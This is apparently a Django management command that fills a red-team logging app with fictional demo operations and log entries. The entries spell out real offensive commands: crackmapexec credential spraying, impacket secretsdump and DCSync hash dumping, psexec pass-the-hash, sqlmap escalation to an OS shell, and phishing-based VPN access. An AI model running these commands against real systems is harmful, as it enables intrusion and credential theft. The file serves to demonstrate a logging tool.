"""
Populate the database with realistic C2/red-team demo data.

Usage:
    python manage.py seed_demo_data
    python manage.py seed_demo_data --clear   # wipe demo data first

NOTE (PoC): This command creates fake but realistic-looking red team
operation data for demonstration purposes. All IPs, hostnames, and
credentials are fictional.
"""

from datetime import timedelta

from django.core.management.base import BaseCommand
from django.utils import timezone

from logs.models import Log
from operations.models import Operation, UserOperation
from tags.models import LogTag, Tag


DEMO_OPERATIONS = [
    {
        "name": "NIGHTFALL",
        "description": "Internal network penetration test targeting corporate AD environment",
        "created_by": "admin",
    },
    {
        "name": "IRON GATE",
        "description": "Web application assessment of external-facing services",
        "created_by": "admin",
    },
    {
        "name": "SILENT STORM",
        "description": "Phishing campaign simulation and social engineering assessment",
        "created_by": "admin",
    },
]

DEMO_LOGS = [
    # NIGHTFALL operation logs - AD pentest
    {
        "op": "NIGHTFALL",
        "timestamp_offset_hours": -48,
        "hostname": "DC01.corp.local",
        "internal_ip": "10.10.1.5",
        "external_ip": "",
        "domain": "corp.local",
        "username": "svc_backup",
        "command": "crackmapexec smb 10.10.1.0/24 -u svc_backup -p Password1",
        "notes": "Initial SMB enumeration with compromised service account",
        "status": "success",
        "analyst": "operator1",
        "tags": ["credential-access", "smb", "lateral-movement"],
    },
    {
        "op": "NIGHTFALL",
        "timestamp_offset_hours": -47,
        "hostname": "WS-PC042.corp.local",
        "internal_ip": "10.10.2.42",
        "external_ip": "",
        "domain": "corp.local",
        "username": "jsmith",
        "command": "impacket-secretsdump corp.local/svc_backup@10.10.2.42",
        "notes": "Dumped local SAM hashes from workstation",
        "status": "success",
        "analyst": "operator1",
        "tags": ["credential-access", "impacket"],
    },
    {
        "op": "NIGHTFALL",
        "timestamp_offset_hours": -46,
        "hostname": "DC01.corp.local",
        "internal_ip": "10.10.1.5",
        "external_ip": "",
        "domain": "corp.local",
        "username": "DA-admin",
        "command": "impacket-psexec corp.local/DA-admin@10.10.1.5",
        "notes": "Achieved domain admin via pass-the-hash",
        "status": "success",
        "analyst": "operator1",
        "tags": ["lateral-movement", "impacket", "command-and-control"],
    },
    {
        "op": "NIGHTFALL",
        "timestamp_offset_hours": -45,
        "hostname": "DC01.corp.local",
        "internal_ip": "10.10.1.5",
        "external_ip": "",
        "domain": "corp.local",
        "username": "DA-admin",
        "command": "impacket-secretsdump -just-dc corp.local/DA-admin@10.10.1.5",
        "notes": "DCSync - dumped all domain password hashes",
        "status": "success",
        "analyst": "operator1",
        "tags": ["credential-access", "impacket", "high-priority"],
    },
    # IRON GATE operation logs - web app assessment
    {
        "op": "IRON GATE",
        "timestamp_offset_hours": -36,
        "hostname": "webapp01.example.com",
        "internal_ip": "",
        "external_ip": "203.0.113.50",
        "domain": "example.com",
        "username": "",
        "command": "nuclei -u https://webapp01.example.com -t cves/",
        "notes": "Automated vulnerability scan of external web application",
        "status": "success",
        "analyst": "operator2",
        "tags": ["reconnaissance", "nuclei"],
    },
    {
        "op": "IRON GATE",
        "timestamp_offset_hours": -35,
        "hostname": "webapp01.example.com",
        "internal_ip": "",
        "external_ip": "203.0.113.50",
        "domain": "example.com",
        "username": "",
        "command": "sqlmap -u 'https://webapp01.example.com/search?q=test' --batch",
        "notes": "SQL injection testing on search endpoint - confirmed blind SQLi",
        "status": "success",
        "analyst": "operator2",
        "tags": ["web-application", "sql-injection", "high-priority"],
    },
    {
        "op": "IRON GATE",
        "timestamp_offset_hours": -34,
        "hostname": "webapp01.example.com",
        "internal_ip": "",
        "external_ip": "203.0.113.50",
        "domain": "example.com",
        "username": "dbadmin",
        "command": "sqlmap -u 'https://webapp01.example.com/search?q=test' --os-shell",
        "notes": "Escalated SQLi to OS command execution",
        "status": "success",
        "analyst": "operator2",
        "tags": ["web-application", "sql-injection", "command-and-control"],
    },
    # SILENT STORM operation logs - phishing
    {
        "op": "SILENT STORM",
        "timestamp_offset_hours": -24,
        "hostname": "mail.target.com",
        "internal_ip": "",
        "external_ip": "198.51.100.25",
        "domain": "target.com",
        "username": "",
        "command": "gophish - campaign 'Q4 Benefits Update' launched",
        "notes": "Phishing campaign sent to 150 employees, 23 clicked, 8 entered creds",
        "status": "success",
        "analyst": "operator1",
        "tags": ["phishing", "social-engineering", "initial-access"],
    },
    {
        "op": "SILENT STORM",
        "timestamp_offset_hours": -23,
        "hostname": "VPN-GW.target.com",
        "internal_ip": "",
        "external_ip": "198.51.100.1",
        "domain": "target.com",
        "username": "mwilliams",
        "command": "openconnect --user mwilliams vpn.target.com",
        "notes": "VPN access with phished credentials - no MFA enforced",
        "status": "success",
        "analyst": "operator1",
        "tags": ["initial-access", "credential-access", "high-priority"],
    },
    {
        "op": "SILENT STORM",
        "timestamp_offset_hours": -22,
        "hostname": "FS01.target.local",
        "internal_ip": "172.16.5.10",
        "external_ip": "",
        "domain": "target.local",
        "username": "mwilliams",
        "command": "smbclient //FS01/finance$ -U mwilliams",
        "notes": "Accessed finance share with phished user credentials",
        "status": "success",
        "analyst": "operator1",
        "tags": ["lateral-movement", "smb", "data-exfiltration"],
    },
]


class Command(BaseCommand):
    help = "Populate database with realistic C2/red-team demo data"

    def add_arguments(self, parser):
        parser.add_argument(
            "--clear",
            action="store_true",
            help="Remove existing demo data before seeding",
        )

    def handle(self, *args, **options):
        if options["clear"]:
            self._clear_demo_data()

        self._seed_operations()
        self._seed_logs()
        self.stdout.write(self.style.SUCCESS("Demo data seeded successfully"))

    def _clear_demo_data(self):
        op_names = [op["name"] for op in DEMO_OPERATIONS]
        # Delete logs whose analyst is a demo analyst
        Log.objects.filter(analyst__in=["operator1", "operator2"]).delete()
        Operation.objects.filter(name__in=op_names).delete()
        self.stdout.write(self.style.WARNING("Cleared existing demo data"))

    def _seed_operations(self):
        now = timezone.now()
        for op_data in DEMO_OPERATIONS:
            op, created = Operation.objects.get_or_create(
                name=op_data["name"],
                defaults={
                    "description": op_data["description"],
                    "created_by": op_data["created_by"],
                },
            )
            if created:
                # Assign both admin and user to each operation
                UserOperation.objects.get_or_create(
                    username="admin",
                    operation=op,
                    defaults={"is_primary": True, "assigned_by": "system"},
                )
                UserOperation.objects.get_or_create(
                    username="user",
                    operation=op,
                    defaults={"is_primary": False, "assigned_by": "admin"},
                )
                self.stdout.write(f"  Created operation: {op.name}")
            else:
                self.stdout.write(f"  Operation already exists: {op.name}")

    def _seed_logs(self):
        now = timezone.now()
        # Build a tag name -> Tag lookup
        all_tag_names = set()
        for log_data in DEMO_LOGS:
            all_tag_names.update(log_data.get("tags", []))

        existing_tags = {t.name: t for t in Tag.objects.filter(name__in=all_tag_names)}

        # Create any missing tags
        for tag_name in all_tag_names:
            if tag_name not in existing_tags:
                tag = Tag.objects.create(
                    name=tag_name,
                    category="technique",
                    is_default=False,
                    created_by="system",
                )
                existing_tags[tag_name] = tag

        # Build operation name -> operation tag lookup
        op_names = [op_data["name"] for op_data in DEMO_OPERATIONS]
        op_tag_map = {}
        for op in Operation.objects.filter(name__in=op_names).select_related("tag"):
            if op.tag:
                op_tag_map[op.name] = op.tag

        for log_data in DEMO_LOGS:
            ts = now + timedelta(hours=log_data["timestamp_offset_hours"])
            log, created = Log.objects.get_or_create(
                hostname=log_data["hostname"],
                command=log_data["command"],
                analyst=log_data["analyst"],
                defaults={
                    "timestamp": ts,
                    "internal_ip": log_data.get("internal_ip", ""),
                    "external_ip": log_data.get("external_ip", ""),
                    "domain": log_data.get("domain", ""),
                    "username": log_data.get("username", ""),
                    "notes": log_data.get("notes", ""),
                    "status": log_data.get("status", ""),
                },
            )
            if created:
                # Add technique tags
                for tag_name in log_data.get("tags", []):
                    tag = existing_tags[tag_name]
                    LogTag.objects.get_or_create(
                        log=log,
                        tag=tag,
                        defaults={"tagged_by": "system"},
                    )
                # Link log to its operation's tag
                op_tag = op_tag_map.get(log_data["op"])
                if op_tag:
                    LogTag.objects.get_or_create(
                        log=log,
                        tag=op_tag,
                        defaults={"tagged_by": "system"},
                    )
                self.stdout.write(f"  Created log: {log_data['command'][:60]}...")
            else:
                # Ensure operation tag link exists for pre-existing logs too
                op_tag = op_tag_map.get(log_data["op"])
                if op_tag:
                    LogTag.objects.get_or_create(
                        log=log,
                        tag=op_tag,
                        defaults={"tagged_by": "system"},
                    )
                self.stdout.write(f"  Log already exists: {log_data['command'][:60]}...")
